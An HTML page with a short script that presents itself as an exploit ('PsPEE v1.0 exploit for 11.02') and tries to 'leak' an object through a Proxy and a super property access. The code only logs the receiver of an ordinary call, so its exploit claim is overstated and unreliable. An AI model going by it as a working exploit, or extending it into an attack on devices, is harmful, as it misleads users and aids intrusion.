<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #333;
            color: #00FF00;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        // Function to log to the div
        function logToDiv(message) {
            const outputDiv = document.getElementById('output');
            outputDiv.textContent += message + '\n';
        }

        logToDiv("[INFO] PsPEE v1.0 exploit for 11.02.");

        // Exploit 1: Leak a JS object via Proxy + super.prop
        function leakJSScope(obj) {
            // Now extend Object so super.foo is legal
            class Leaker extends Object {
                leak() {
                    return super.foo;
                }
            }

            // Intercept property access to grab the real `this`
            Leaker.prototype.__proto__ = new Proxy({}, {
                get(target, prop, receiver) {
                    logToDiv("[Leak] Receiver → " + receiver);
                    return 1;
                }
            });

            const foo = 42;
            const { leak } = Leaker.prototype;
            // Bind our target object as `this`
            leak.call(obj);
        }

        // Start the exploit on a typed array so we can see "[object Uint8Array]"
        window.onload = function() {
            logToDiv("[*] Attempting to leak a Uint8Array as `this`…");
            leakJSScope(new Uint8Array(16));
        };
    </script>
</body>
</html>
